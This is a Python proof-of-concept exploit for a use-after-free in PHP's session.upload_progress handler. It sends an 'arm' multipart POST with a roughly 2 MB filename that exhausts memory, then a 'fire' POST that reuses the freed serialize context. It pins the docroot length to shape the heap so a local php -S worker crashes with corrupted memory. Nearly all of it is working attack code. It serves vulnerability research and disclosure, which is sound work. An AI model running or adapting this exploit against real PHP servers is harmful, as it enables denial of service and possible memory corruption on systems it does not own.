#!/usr/bin/env python3
"""
PoC — cross-request use-after-free in PHP's session.upload_progress handler.

Two requests against ONE long-lived PHP worker (prefork child or `php -S`):

  R1 "arm"   multipart/form-data POST carrying
               - a field named PHP_SESSION_UPLOAD_PROGRESS   (turns the handler on)
               - a file part whose filename is ~2 MB
             php_session_rfc1867_callback() copies the filename into the
             in-flight progress array, php_session_encode() serialises that
             array, and the serializer exhausts the request's memory_limit.
             The fatal fires in php_hash_environment(), i.e. BEFORE
             PHP_RINIT_FUNCTION(basic). So BG(serialize).level stays 1 and
             BG(serialize).data still points at a 64-byte php_serialize_data
             that the Zend MM frees at request shutdown.

  R2 "fire"  one more multipart POST with a progress field.
             php_hash_environment() runs again before RINIT, so
             php_var_serialize_init() sees level != 0 and takes the reuse
             branch: it hands back the freed context WITHOUT calling
             zend_hash_init() on it. Whatever now occupies those 64 bytes is
             interpreted as a HashTable.

Why the docroot length matters (measured, see notes/journal.md):
    the 64-byte block is recycled during request startup by the zend_string
    holding SCRIPT_FILENAME = docroot + "/probe.php". Its size is
    25 + len(docroot) + 10, which lands in the 64-byte bucket exactly when
    len(docroot) is 22..29. Inside that window the abort is 4/4; outside it
    the reuse still happens (see trace.gdb) but the allocator does not trip.
    The PoC therefore serves from a scratch docroot inside that window.

Local only. Do not point this at anything you do not own.
"""
from __future__ import annotations

import argparse
import os
import re
import shutil
import socket
import subprocess
import sys
import time

BOUNDARY = "----labboundary"
TARGET_DOCROOT_LEN = 28
HERE = os.path.dirname(os.path.abspath(__file__))


# --------------------------------------------------------------------------
# wire format
# --------------------------------------------------------------------------
def multipart(sid: str, filename_len: int, data_len: int, progress: bool = True) -> bytes:
    parts: list[bytes] = []
    if progress:
        parts.append(
            f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            f"\r\n\r\n{sid}\r\n".encode()
        )
    parts.append(
        (
            f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="upfile"; '
            f'filename="{"F" * filename_len}"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
    )
    parts.append(b"D" * data_len + b"\r\n")
    parts.append(f"--{BOUNDARY}--\r\n".encode())
    return b"".join(parts)


def post(port: int, body: bytes, sid: str, timeout: float = 30.0) -> bytes:
    head = (
        f"POST /probe.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    sock = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    sock.sendall(head + body)
    out = b""
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        out += chunk
    sock.close()
    return out


def first_line(resp: bytes) -> str:
    return resp.split(b"\r\n", 1)[0].decode(errors="replace") if resp else "<connection died>"


def oom_in(resp: bytes) -> str | None:
    m = re.search(
        rb"Allowed memory size of (\d+) bytes exhausted \(tried to allocate (\d+) bytes\)", resp
    )
    return f"limit={m.group(1).decode()} alloc={m.group(2).decode()}" if m else None


# --------------------------------------------------------------------------
# server
# --------------------------------------------------------------------------
def run(port: int, mem_limit: str, filename_len: int, handler: bool,
        workdir: str, docroot: str | None) -> dict:
    if docroot is None:
        # Pin the total length: SCRIPT_FILENAME = docroot + "/probe.php" is
        # allocated at 25 + len(docroot) + 10 bytes, which lands in the 64-byte
        # bucket exactly for len(docroot) in 22..29.
        pad = TARGET_DOCROOT_LEN - len(workdir) - 1
        if pad < 1:
            raise SystemExit(f"--workdir is too long ({len(workdir)} chars); pass --docroot")
        docroot = os.path.join(workdir, "d" * pad)
        # only ever wipe a docroot this script created itself
        shutil.rmtree(docroot, ignore_errors=True)
    else:
        # never rmtree a directory the caller pointed us at: someone will pass
        # --docroot /var/www/html and we are not going to delete their site
        if not os.path.isdir(docroot):
            raise SystemExit(f"--docroot {docroot} does not exist")
    os.makedirs(os.path.join(docroot, "sess"), exist_ok=True)
    probe = os.path.join(docroot, "probe.php")
    if not os.path.exists(probe):
        shutil.copy(os.path.join(HERE, "probe.php"), probe)

    sess_dir = os.path.join(docroot, "sess")
    log_path = os.path.join(workdir, "server.log")
    cmd = [
        "php", "-n",
        "-d", "post_max_size=64M",
        "-d", "upload_max_filesize=32M",
        "-d", f"session.save_path={sess_dir}",
        "-d", f"memory_limit={mem_limit}",
        "-d", f"session.upload_progress.enabled={1 if handler else 0}",
        "-d", "display_errors=1",
        "-S", f"127.0.0.1:{port}", "-t", docroot,
    ]
    # cwd == docroot: keeps the startup allocations identical no matter where
    # this script is launched from. PHP allocates strings for both paths, and
    # their sizes decide which of them lands in the 64-byte bin.
    proc = subprocess.Popen(cmd, stdout=open(log_path, "w"), stderr=subprocess.STDOUT,
                            cwd=docroot)
    time.sleep(0.9)

    res: dict = {"cmd": " ".join(cmd), "docroot_len": len(docroot)}

    try:
        r1 = post(port, multipart("arm1", filename_len, 1000), "arm1")
        res["r1_status"] = first_line(r1)
        res["r1_oom"] = oom_in(r1)
    except OSError as exc:
        proc.kill()
        return {**res, "r1_status": f"<no response: {exc}>", "r1_oom": None}

    time.sleep(0.25)
    try:
        res["r2_status"] = first_line(post(port, multipart("fire1", 10, 100), "fire1"))
    except OSError as exc:
        res["r2_status"] = f"<no response: {exc}>"

    time.sleep(0.4)
    rc = proc.poll()
    if rc is None:
        proc.kill()
        proc.wait()
        res["worker"] = "survived"
    else:
        res["worker"] = f"died (exit {rc}, signal {abs(rc)})"

    with open(log_path, "r", errors="replace") as fh:
        res["log"] = [ln.strip() for ln in fh if ln.strip()]
    return res


def main() -> int:
    ap = argparse.ArgumentParser(description="PHP session.upload_progress cross-request UAF PoC")
    ap.add_argument("--port", type=int, default=9411)
    ap.add_argument("--mem-limit", default="8M")
    ap.add_argument("--filename-len", type=int, default=2_000_000,
                    help="length of the uploaded filename; a heap-shaping value, "
                         "not just a size (2,097,152 does NOT abort on the reference build)")
    ap.add_argument("--handler", type=int, default=1, choices=(0, 1),
                    help="session.upload_progress.enabled (0 = control)")
    ap.add_argument("--workdir", default="/tmp/php-session-uaf")
    ap.add_argument("--docroot", default=None,
                    help="serve from this directory instead of a tuned scratch docroot")
    args = ap.parse_args()

    os.makedirs(args.workdir, exist_ok=True)
    res = run(args.port, args.mem_limit, args.filename_len, bool(args.handler),
              args.workdir, args.docroot)

    print(f"docroot      : len={res['docroot_len']}  ({'tuned' if 22 <= res['docroot_len'] <= 29 else 'outside 22..29 window'})")
    print(f"R1 arm       : {res.get('r1_status')}  oom={res.get('r1_oom') or 'no'}")
    print(f"R2 fire      : {res.get('r2_status')}")
    print(f"worker       : {res['worker']}")
    for line in [l for l in res["log"] if re.search(r"corrupt|Aborted|Segmentation|memory size", l)][-4:]:
        print(f"log          : {line}")

    fired = res["worker"].startswith("died")
    print("VERDICT      :", "FIRED — heap corrupted by the reused serialize context"
          if fired else "no abort (context was still reused; see trace.sh)")
    return 0 if fired else 1


if __name__ == "__main__":
    sys.exit(main())
